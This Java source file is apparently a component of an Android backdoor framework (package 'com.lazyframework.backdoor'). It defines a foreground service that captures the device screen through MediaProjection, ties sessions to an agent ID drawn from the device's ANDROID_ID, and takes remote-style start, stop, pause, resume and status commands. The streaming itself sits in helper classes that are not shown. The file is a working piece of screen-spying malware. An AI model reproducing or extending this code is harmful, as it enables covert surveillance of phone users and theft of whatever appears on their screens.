package com.lazyframework.backdoor;

import static android.app.Activity.RESULT_OK;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.RequiresApi;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class ScreenMirrorService extends Service {

    private static final String TAG = "ScreenMirrorService";
    private static final String CHANNEL_ID = "screen_mirror_channel";
    private static final int NOTIFICATION_ID = 2;

    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private ScreenMirrorHelper mirrorHelper;
    private Handler handler;
    private static boolean sIsMirroring = false;
    private static MediaProjection sMediaProjection = null;
    private String agentId = null;
    private boolean isServiceRunning = false;
    private boolean isForegroundStarted = false;
    private boolean isStarting = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎬 ScreenMirrorService onCreate");

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        handler = new Handler(Looper.getMainLooper());

        createNotificationChannel();

        mirrorHelper = ServiceController.getScreenMirrorHelper();

if (mirrorHelper == null) {
    mirrorHelper = new ScreenMirrorHelper();
    mirrorHelper.onCreate(this);
    ServiceController.setScreenMirrorHelper(mirrorHelper);
    
    Log.d(TAG, "✅ ServiceController: AgentService=" + 
        (ServiceController.isAgentServiceAvailable() ? "✅" : "❌") +
        ", Helper=" + (ServiceController.isMirrorHelperAvailable() ? "✅" : "❌") +
        ", Service=" + (ServiceController.isMirrorServiceAvailable() ? "✅" : "❌"));

        // ✅ JANGAN reset AgentService di sini
        // ScreenMirrorHelper.setAgentService(null); // HAPUS INI!
    }
}
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "📡 onStartCommand");

        // ✅ CRITICAL: Call startForeground IMMEDIATELY
        if (!isForegroundStarted) {
            try {
                createNotificationChannel();
                startForeground(NOTIFICATION_ID, createNotification("Starting screen mirror..."));
                isForegroundStarted = true;
                Log.d(TAG, "✅ Foreground service started immediately");
            } catch (Exception e) {
                Log.e(TAG, "❌ Failed to start foreground: " + e.getMessage());
                stopSelf();
                return START_NOT_STICKY;
            }
        }

        if (intent == null) {
            Log.w(TAG, "⚠️ Intent is null, stopping service");
            stopSelf();
            return START_NOT_STICKY;
        }

        String action = intent.getStringExtra("action");
        Log.d(TAG, "Action: " + action);

        agentId = intent.getStringExtra("agent_id");
        if (agentId == null) {
            agentId = android.provider.Settings.Secure.getString(
                    getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
            );
        }

        // ✅ JANGAN reset AgentService di sini
        // ScreenMirrorHelper.setAgentService(null); // HAPUS INI!

        if ("START_MIRROR".equals(action)) {
            int resultCode = intent.getIntExtra("media_projection_result", 0);
            Intent data = intent.getParcelableExtra("media_projection_data");
            handleStartMirror(resultCode, data);

        } else if ("START_MIRROR_ALTERNATIVE".equals(action)) {
            handleAlternativeStart();

        } else if ("STOP_MIRROR".equals(action)) {
            handleStopMirror();

        } else if ("PAUSE_MIRROR".equals(action)) {
            handlePauseMirror();

        } else if ("RESUME_MIRROR".equals(action)) {
            handleResumeMirror();

        } else if ("GET_STATUS".equals(action)) {
            handleGetStatus();

        } else {
            Log.w(TAG, "⚠️ Unknown action: " + action);
        }

        return START_STICKY;
    }

    private void handleStartMirror(int resultCode, Intent data) {
        Log.d(TAG, "handleStartMirror - resultCode: " + resultCode);

        if (isStarting) {
            Log.d(TAG, "⚠️ Start mirror already in progress, ignoring");
            return;
        }

        if (sIsMirroring) {
            Log.d(TAG, "⚠️ Already mirroring, ignoring start request");
            return;
        }

        isStarting = true;

        try {
            if (resultCode == RESULT_OK && data != null) {
                mediaProjection = projectionManager.getMediaProjection(resultCode, data);

                if (mediaProjection == null) {
                    Log.e(TAG, "❌ MediaProjection is null");
                    notifyMirrorError("Failed to get MediaProjection");
                    stopSelf();
                    return;
                }

                sMediaProjection = mediaProjection;

                updateNotification("Screen Mirror Active");

                handler.postDelayed(() -> {
                    if (mirrorHelper != null && mediaProjection != null) {
                        mirrorHelper.startScreenCapture(mediaProjection);
                        sIsMirroring = true;
                        isServiceRunning = true;
                        Log.d(TAG, "✅ Screen mirroring STARTED successfully");
                        notifyMirrorStarted();
                    } else {
                        Log.e(TAG, "❌ Mirror helper or projection is null");
                        notifyMirrorError("Mirror helper not ready");
                        stopSelf();
                    }
                }, 500);

            } else {
                Log.w(TAG, "❌ User denied screen recording permission");
                notifyMirrorError("Permission denied by user");
                stopSelf();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting mirror: " + e.getMessage(), e);
            notifyMirrorError("Error: " + e.getMessage());
            stopSelf();
        } finally {
            isStarting = false;
        }
    }

    private void handleAlternativeStart() {
        Log.d(TAG, "🔄 Alternative start");

        try {
            if (sMediaProjection != null) {
                mediaProjection = sMediaProjection;
                updateNotification("Screen Mirror Active");

                handler.postDelayed(() -> {
                    if (mirrorHelper != null) {
                        mirrorHelper.startScreenCapture(mediaProjection);
                        sIsMirroring = true;
                        isServiceRunning = true;
                        Log.d(TAG, "✅ Mirror started from existing projection");
                    }
                }, 300);
            } else {
                Log.e(TAG, "❌ No existing MediaProjection found");
                notifyMirrorError("No MediaProjection available");
                stopSelf();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Alternative start failed: " + e.getMessage());
            notifyMirrorError("Alternative start failed");
            stopSelf();
        }
    }

    private void handleStopMirror() {
        Log.d(TAG, "⏹️ Stopping mirror");

        sIsMirroring = false;
        isServiceRunning = false;

        if (mirrorHelper != null) {
            mirrorHelper.stopScreenCapture();
        }

        if (mediaProjection != null) {
            try {
                mediaProjection.stop();
                mediaProjection = null;
                sMediaProjection = null;
            } catch (Exception e) {
                Log.e(TAG, "Error stopping projection: " + e.getMessage());
            }
        }

        notifyMirrorStopped();
        stopSelf();
    }

    private void handlePauseMirror() {
        if (mirrorHelper != null) {
            mirrorHelper.pauseCapture();
            Log.d(TAG, "⏸️ Mirror paused");
            updateNotification("Screen Mirror Paused");
        }
    }

    private void handleResumeMirror() {
        if (mirrorHelper != null) {
            mirrorHelper.resumeCapture();
            Log.d(TAG, "▶️ Mirror resumed");
            updateNotification("Screen Mirror Active");
        }
    }

    private void handleGetStatus() {
        try {
            Intent statusIntent = new Intent("com.lazyframework.MIRROR_STATUS");
            statusIntent.putExtra("is_mirroring", sIsMirroring);
            statusIntent.putExtra("is_capturing", mirrorHelper != null && mirrorHelper.isCapturing());
            statusIntent.putExtra("frame_count", mirrorHelper != null ? mirrorHelper.getFrameCount() : 0);
            sendBroadcast(statusIntent);
        } catch (Exception e) {
            Log.e(TAG, "Status broadcast error: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Screen Mirror",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Screen Mirror Service");
            channel.setSound(null, null);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("📸 Screen Mirror")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setPriority(Notification.PRIORITY_LOW)
                    .setOngoing(true)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("📸 Screen Mirror")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setPriority(Notification.PRIORITY_LOW)
                    .setOngoing(true)
                    .build();
        }
    }

    private void updateNotification(String text) {
        try {
            if (isForegroundStarted) {
                startForeground(NOTIFICATION_ID, createNotification(text));
            }
        } catch (Exception e) {
            Log.e(TAG, "Update notification error: " + e.getMessage());
        }
    }

    private void notifyMirrorStarted() {
        try {
            Intent intent = new Intent("com.lazyframework.MIRROR_STARTED");
            intent.putExtra("agent_id", agentId);
            intent.putExtra("success", true);
            sendBroadcast(intent);
            Log.d(TAG, "📡 Mirror started broadcast sent");
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }

    private void notifyMirrorStopped() {
        try {
            Intent intent = new Intent("com.lazyframework.MIRROR_STOPPED");
            intent.putExtra("agent_id", agentId);
            sendBroadcast(intent);
            Log.d(TAG, "📡 Mirror stopped broadcast sent");
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }

    private void notifyMirrorError(String error) {
        try {
            Intent intent = new Intent("com.lazyframework.MIRROR_ERROR");
            intent.putExtra("agent_id", agentId);
            intent.putExtra("error", error);
            sendBroadcast(intent);
            Log.d(TAG, "📡 Mirror error broadcast sent: " + error);
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }

    public static boolean isMirroring() {
        return sIsMirroring;
    }

    public static MediaProjection getMediaProjection() {
        return sMediaProjection;
    }
public static void setMediaProjection(MediaProjection projection) {
    sMediaProjection = projection;
}
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "⏹️ ScreenMirrorService onDestroy");

        sIsMirroring = false;
        isServiceRunning = false;
        isForegroundStarted = false;

        if (mirrorHelper != null) {
            mirrorHelper.stopScreenCapture();
            mirrorHelper.destroy();
            mirrorHelper = null;
        }

        if (mediaProjection != null) {
            try {
                mediaProjection.stop();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping projection: " + e.getMessage());
            }
            mediaProjection = null;
            sMediaProjection = null;
        }
        // ✅ TAMBAHKAN INI:
    ServiceController.clearMirrorHelper();
    ServiceController.clearMirrorService();
    Log.d(TAG, "✅ ServiceController references cleared");

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
